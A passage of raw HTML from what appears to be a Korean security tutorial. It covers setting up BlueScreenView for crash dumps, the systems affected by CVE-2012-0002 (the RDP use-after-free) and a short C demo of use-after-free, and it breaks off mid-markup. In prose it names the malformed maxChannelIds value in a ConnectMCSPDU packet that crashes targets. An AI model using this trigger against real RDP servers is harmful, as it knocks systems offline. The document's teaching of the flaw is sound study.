url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABK0lEQVQoz43QwU7CQBAG4H02paloAqmiFw+ejEcflHBREpY2pd1tIbNN7Wy3rNvSsjWBxBOIX+Y6f+YfMnl6GThjx/UGzvjqeuS43vDu8eZ24ried//8+vbuDh9OzsAZkSRJAcTHx+d8Pp/NZpRSIQQAIOLXQXEKIjLGiVJKax0EQZqmSZJsNhtEVEpZa9u27c7Y7/eISBBRSun7/nK5XCwWcRwDwHq91lqb8+q6zrKMVFVV1zU/WK1WAGCM0Vof48+x1kopiZSyKIowDKMoopSGYViWpTHm+0/GGCEEOd7AGAMAIUSe55zzpmn6S5RSZLvdNk3j+z7nPI5jxpiU0lr7r2WtdVVVv52zLOv7vr2k67qiKEie52VZBkFAKZ1Op1EU7Xa7Y6uL3/4B8zEQMTKZPoAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 4 1 3\"\n        title=\"image 4 1 3\"\n        src=\"/static/b1f0104bbc47d9bd848a075f74c5b6c7/76aed/image-4.1.3.png\"\n        srcset=\"/static/b1f0104bbc47d9bd848a075f74c5b6c7/e9ff0/image-4.1.3.png 180w,\n/static/b1f0104bbc47d9bd848a075f74c5b6c7/f21e7/image-4.1.3.png 360w,\n/static/b1f0104bbc47d9bd848a075f74c5b6c7/76aed/image-4.1.3.png 546w\"\n        sizes=\"(max-width: 546px) 100vw, 546px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>4. BlueScreenView 설치</p>\n<p>BSOD 장애가 발생할 환경에서 BSOD 덤프정보를 확인할 수 있는 프로그램 설치</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADeElEQVQ4y3WR3WsjZRTGX4io4M2CLHi36r2sIPhPiP+A7CJavNF10XrhdgVRXHFhi25BVLYtajsW624/rG2apE2bZCbp5HNmkmkySdqmaZppMtOkadKmzUze95GJglce+PGcc+AcHs4h60oNYr6FpNZCVG0gojQRVo4hSCZ4ybQdDUm1yWhMKGuyiLQYYAnehyTvRTq6CSURgpYWLUeVRGiUuFNdbEQN+Dd2sOY/xIpnHx5fBQHeQFCo25t8HSm5PXls6uWDyiFsy2KVfAal7QzqlTJMowajfmTtFPPIZdVRMhdqUblg0KahU7Neo6ah01azQXO5bcqHwz01q+JQP5honTZL+tERej2rzyyLMsumYKDAgEv8Ew/I0mYbSbWDevkUnc6ZMwDLtlHQ0gisLUPc8ECKC9On5+eGaZr4/2Dods/HyHLwmBNjbe5Q63Dt9gnXOmly7dMWJyXj3Nrq8lQk5JtLRfn3Ikp5TJSKs+Vqazq/Z3IVo8MdGmecbp5z9cbFr/rx2aK2e/QW2cnK8p6myka9KheLRVnNZORKZV+u1XT5oFxONhvGjn6kf/Fw9KfVh19/n/3m3g/S2IMJefzHKfnRoxl5/JfH8uTUXOLn3xZK07N/DRO/L4alRQFur4Qn7iQW5tex8McyZn/3YNGTgN3vo9u9nF738YYU20I6KSIeFsD7NpAIxxAVU5BSKqJbSaiK9h2xLJv2KaUAGxy4qG3TpcczNJ2KU0r7PQYGu9ef8K8GS17vOvxrm333io8GAjwNBQUaDIRomI/0w0IEwkagSgDYDpTSgVYrJTvoX7HzWcVmjP37PTYeD8f20+kMMorMRDGKtKIgl81CliVouaxTMyUeB2GMYYBjEkClvIctfg3FfGbQd8ybhjGTy2T1nnWBi26bNRoGLKsLxix0u23YVpddXHbQrFWp43CIMTZEKR1y8t2iNuRzzw/tFbNO/92eZX9wdmK8lhJzc2KkgIiQ70eEPCLhPLbCefAhDXxQQzCYQ8AnDxwOoHSwnJR2C8Tnnie7BXVQO7x58wl54eq9+1eu3sczz31lPfXslyDkcxDyGQi5C0JG/lMALsaYi1LqcvL9vaLL7/3TtVtQXf1LyzUzuvr0G8/fJp++fvfbW9dHcOv6HevDV0fw/it38PbLn+DGtY9x88Vh3Lg2jHde+gh/A5uZS2EXS8U3AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image21\"\n        title=\"image21\"\n        src=\"/static/1b408504f5c7864ab444c3a8f930d978/0a47e/image21.png\"\n        srcset=\"/static/1b408504f5c7864ab444c3a8f930d978/e9ff0/image21.png 180w,\n/static/1b408504f5c7864ab444c3a8f930d978/f21e7/image21.png 360w,\n/static/1b408504f5c7864ab444c3a8f930d978/0a47e/image21.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 547px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABAElEQVQY03XPUWuDMBQF4PzAba26lVq3sg4m7KX/VcRGi1Siixpp0y56Q1TQ0QhjfejHebznwEWuu33ffL0s1qblmM+vpuUY5sqwnJlhz+b2p7t9W7sPj4un+dIwV0t7Y68+/oIAoG3bvu+ZVl4VZVlWVZXneZZlnHNoGiGElHIYhvEflGXZVMMYB0Hg+z7GmDHGOS+K68q1DNA0TV3XP7cQIaSqKsbYbrfDGIdhGEVRmqb7/T5JkjiOhTZdi1vocrkAgBCCUno4HOq67roOAJRSXdcppfr70Pl8lhql9FuLoogQMo7j9OFwHyqKgnN+PB6x5nlemqan00lKCZq87xd71GVlkUMnTQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 4 1 4\"\n        title=\"image 4 1 4\"\n        src=\"/static/78528d128c548111bde3239c2ef2b5a4/977f7/image-4.1.4.png\"\n        srcset=\"/static/78528d128c548111bde3239c2ef2b5a4/e9ff0/image-4.1.4.png 180w,\n/static/78528d128c548111bde3239c2ef2b5a4/f21e7/image-4.1.4.png 360w,\n/static/78528d128c548111bde3239c2ef2b5a4/977f7/image-4.1.4.png 547w\"\n        sizes=\"(max-width: 547px) 100vw, 547px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>BSOD 메모리 덤프 분석을 하기위한 환경 설정 과정을 마쳤다. 5.7.2 Windbg\n동적 분석 장에서 분석하기 위해 사용될 것이기 때문에 환경 구성 한다. 현재\n과정에서 CVE-2012-0002 취약점을 통한 공격을 수행한후 대상 서버에서 BSOD\n장애가 발생하면 해당 메모리 덤프가 저장되어 분석을 할 수 있다.</p>\n<h1 id=\"cve-2012-0002-분석\" style=\"position:relative;\"><a href=\"#cve-2012-0002-%EB%B6%84%EC%84%9D\" aria-label=\"cve 2012 0002 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CVE-2012-0002 분석</h1>\n<h2 id=\"cve-2012-0002-취약점-개요\" style=\"position:relative;\"><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B0%9C%EC%9A%94\" aria-label=\"cve 2012 0002 취약점 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CVE-2012-0002 취약점 개요</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 545px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA+ElEQVQI1yXGsUrDQBgA4DyMDsWhpoS6pFaHWjuI1EWLaBMK0voIOvkyOrh0EBRRfIMM2XLQP7mj9EyaNASS9i45+EX9pk+r62bnqN8w2kNrvFxGQUAZYwDgeR5jjFLqOI7rugBAKQWA4A9jjHOu1XWz1e4ZzcNra4yIQghZlmX1S0oZx7HvA6VBnudKKSllVVX/kVJqRvPg/MLu9s6uhjdFUcSrVcJ5MpvFSVIU+evbuz26vbt/GFyOPj6/Nus1ABBCwjBM01TbbbROTgfm/rFlTxBxI8T3YhHO51EUIeJ0+lLb2et0+1vb+uPTMyL6fkAIybJMKfUDWziw0KJsuFwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 5 1\"\n        title=\"image 5 1\"\n        src=\"/static/e490a63b7d51a6c296da3986913c33a6/3ddad/image-5.1.png\"\n        srcset=\"/static/e490a63b7d51a6c296da3986913c33a6/e9ff0/image-5.1.png 180w,\n/static/e490a63b7d51a6c296da3986913c33a6/f21e7/image-5.1.png 360w,\n/static/e490a63b7d51a6c296da3986913c33a6/3ddad/image-5.1.png 545w\"\n        sizes=\"(max-width: 545px) 100vw, 545px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"cve-2012-0002-대상-시스템-목록\" style=\"position:relative;\"><a href=\"#cve-2012-0002-%EB%8C%80%EC%83%81-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%AA%A9%EB%A1%9D\" aria-label=\"cve 2012 0002 대상 시스템 목록 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CVE-2012-0002 대상 시스템 목록</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> window XP              <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> window Vista Ultimate  <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> window Server <span class=\"token number\">2003</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> window <span class=\"token number\">7</span>               <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> window Server <span class=\"token number\">2008</span><span class=\"token punctuation\">,</span> R2 <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span></code></pre></div>\n<h2 id=\"cve-2012-0002-취약점-원리\" style=\"position:relative;\"><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9B%90%EB%A6%AC\" aria-label=\"cve 2012 0002 취약점 원리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CVE-2012-0002 취약점 원리</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADn0lEQVQ4y2WSbUxTZxTHT6sMO5UFBSMdSjvpy1paB3W0XIrVipS2YGnvfW5b7nBURQR0y0Jx8jIiyZB1Gs0ynU1mMrcZJx/2kmVvZsmW+GHZJiNzM2ZfWCZuc31B2gAWVnrPcssgS3aSk+fJk/x/Oef/f4AnBP5tEc9xgACwdl2RCJZqo9a6MxFw1fHm7RQWyfVDGsMuYH0HVyMixKcfwv/qP8AsFB0O0dmeQfEroTC8GBwuVxmMf7/b2JB5Vm9ES6P/U0EjwGLhN0XodouzgyzrWXYFuIonZLNwxyoTpL8dg0RyXhaJz0yev/AWSuX6tMvTkh4bv4Nz8/iCAEQRANL0sl6cPRlmBSjjCbnKs2wdT9PBTHOz5X5y/vbM3CJ+8vnXyLW0Y9/AKbwfTWI8kcLYH7EjaKr08RzXyROSv2KZ2w2AHg/wQhNyFFl2AFm2BGuqH40n5y9Fp2an41OzkblUJpaYWYhG4jOR2IO53+LRhBUBJDzHWXlCRnhCCoXpshMKIUy1d25aZL0/z3p9CiRM1iOhJv+alv6AmIeIaxExL5ZIFT9IpNbFIomsTvAsQ8jriwzzBvp98OFe+2poD12EA4InapliGGCNtsxE6cpMRq3WVA0Aa7DBeWSkrIIGkKi+4xH+vBeF6OUrq9BhF2PbIcDW1sfxuWPy4YKipZStXEcPO3y+v7b/dB/VtL8xPyd/fZmeKoZthsKenbvhOk1GuXoXUrsbJt4OncnJpuzzAh4ILH8U4W0jAAjETdBx7ToO3Yng4PhdDIRHR7sTS+su+v1y0DGgdzDBWieNdjt9q8/XkttFc7BAyJZo68HNoXNX4Jn+14ZOvH/jYe8X43fbwh9NQiB8LVZDtyY9J0aQvfRBCFVPlKd9/pMLDPkeWdJmcni6bY4mrKl13Zxi2Uok5DhPyFdpv//cex9/A23vfHk5/EsMP7v1K/be/B1BvkXtVKoqMgrFU2NbC0ukig1SwI7DMEETKdi8UOegB5wNDNrqPbfr61yPTBAvpBhScK95f95AMATOwy/tY7pfvUEfPfkjffzsBXhSV6VXa429aq2xS7PdnKfRU3DRWi/GYACaLHawWOx91dRepMy2n7Lp682AXhawq3PZQwkAbJVAjgEApLBNrgOVegcoVQYoLigBnbICjDoTULqq9eW6qgJZabmmVL3DXaqs2KVUPy1TaSpLXjbvEeOxLthn90LlHk+u/VBQwjw/mGu0sY/9A4hEr7W7ho5OAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image22\"\n        title=\"image22\"\n        src=\"/static/be29eddf484fb717699e8161603d7ad1/32056/image22.png\"\n        srcset=\"/static/be29eddf484fb717699e8161603d7ad1/e9ff0/image22.png 180w,\n/static/be29eddf484fb717699e8161603d7ad1/f21e7/image22.png 360w,\n/static/be29eddf484fb717699e8161603d7ad1/32056/image22.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>RDP가 사용되는 동작 방식은 네트워크 관리자가 다른 컴퓨터를 통해 원격으로\n접속하는 동안에 해당 RDP 서비스를 인터넷을 통해 공유되고 있는 상태에서\n발생된다. RDP는 메모리에 있는 패킷을 처리할 수 없기 때문에 이를 통해\n공격자는 초기화에 실패했거나 현재 실행중인 개체에 대해 T.125\nConnectMCSPDU 패킷의 maxChannelids 필드 값을 5이하로 설정하여\nUse-After-Free 취약점이 발생시킬 수 있는 변조된 RDP MCS 패킷 바이트를\n페이로드로 작성하여 전송을 하여 공격 대상의 단말기에 BSOD 장애를\n발생시켜 가용성을 무너트릴 수 있는 방식이다.</p>\n<p>’</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">※ BlueScreen Of <span class=\"token function\">Death</span> <span class=\"token punctuation\">(</span>BSOD<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> 마이크로소프트 윈도우 운영체제에서 시스템\n오류를 복구하지 못할 때 나타나는 화면</code></pre></div>\n<h2 id=\"공격-기법-및-기본-개념\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EA%B8%B0%EB%B2%95-%EB%B0%8F-%EA%B8%B0%EB%B3%B8-%EA%B0%9C%EB%85%90\" aria-label=\"공격 기법 및 기본 개념 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 기법 및 기본 개념</h2>\n<h3 id=\"uaf-use-after-free\" style=\"position:relative;\"><a href=\"#uaf-use-after-free\" aria-label=\"uaf use after free permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>UAF (Use-After-Free)</h3>\n<p>C, C++ 언어를 활용하여 개발을 진행할 때 수동으로 동적 메모리를 할당을\n하여 관리를 한다. 메모리를 기준에 맞게 관리를 하지 못하여 해제된\n메모리에 접근을 시도하거나 메모리를 할당한 후 해제를 하지 않아 메모리\n누수가 발생되어 큰 문제를 야기시킨다. 동적 메모리를 올바르게 관리하지\n않아 발생하는 취약점 중 하나이다.</p>\n<p>Use-After-Free 취약점은 해제된 메모리에 접근을 하여 값을 쓸 수 있는\n취약점이다. UAF 취약점이 존재하는 소스 코드를 통해 과정을 살펴보겠다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\\#include \\<span class=\"token operator\">&lt;</span>stdio<span class=\"token punctuation\">.</span>h\\<span class=\"token operator\">></span>\n\n\\#include \\<span class=\"token operator\">&lt;</span>stdlib<span class=\"token punctuation\">.</span>h\\<span class=\"token operator\">></span>\n\n\\#include \\<span class=\"token operator\">&lt;</span>string<span class=\"token punctuation\">.</span>h\\<span class=\"token operator\">></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">char</span> \\<span class=\"token operator\">*</span>bufA <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span>\\<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>bufA<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/*1. bufA 변수에 문자열 복사*/</span>\n\n    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>bufA<span class=\"token punctuation\">,</span> <span class=\"token string\">\"boan Project\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> bufA<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/*bufA 메모리 해제*/</span>\n\n    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>bufA<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>bufB <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/*2. bufB 변수에 문자열 복사*/</span>\n\n    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>bufB<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Exploit Zer0Luck\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> bufB<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/*2. bufA 변수에 문자열 복사 (UAF)*/</span>\n\n    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>bufA<span class=\"token punctuation\">,</span> <span class=\"token string\">\"boan Project\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> bufB<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>bufA 변수의 메모리를 총 150바이트 크기만큼 할당한 후 strcpy 함수를 통해\n“boan Project” 문자열을 복사한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABlElEQVQY02NQcbUQdJuTVOq8MKHSaV58hdPihAqn2fEVDoviK2wmRrS5TU7odpgc3WI3Nbrdrjeyw2F2bIPTgoRyp4XxlY5z4yqc5sZXeC9Lr3Cuj6pSktMvZFDytjAOPVryP/RK+f+gCyX/g66V/Q85Wfrf50rhf49zuf/Db1b997tQ9N//Wsn/oJPF//2vl/wPvVj+P+hy6X+/c4X/fc7m/4++Vfs/aEnOfzUl4/8MVlVBvLZLYiPN6gMdLTtD3C27Q93MW4LcrLrD3Cxbgt3NuoPdzVuC3S27Qt3Nm4PcrbpC3SzaQ9wsO0PdLNpC3Czagt3MeoPdTIt93U31HBwYgv836IX9b7W1mR/NYD0jksF2bjSD9bQIBrv5MQw206MYrBZEQcTnxTBYT4tksJsXw2AzKwqszmZmFBhbLYxisGgKZjDVdWBgCPxVpx/4vdbE712lIAMDA4PzjlRmu4WxzA6rEpjtF8UxO65JZLZfHAfmg8QdVyUyOyyLZ3ZYkcBsvyQOjB3WJTLbdkYwG2nZMgEARD2dwbxMpnMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image23\"\n        title=\"image23\"\n        src=\"/static/7e931fd96dc6fa8297279d0b112b1289/0a47e/image23.png\"\n        srcset=\"/static/7e931fd96dc6fa8297279d0b112b1289/e9ff0/image23.png 180w,\n/static/7e931fd96dc6fa8297279d0b112b1289/f21e7/image23.png 360w,\n/static/7e931fd96dc6fa8297279d0b112b1289/0a47e/image23.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>bufA 메모리를 해제한 후 새로운 150바이트 크기의 메모리를 bufB에\n할당한다. strcpy 함수를 통해 “Exploit Zer0Luck” 문자열을 복사한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: 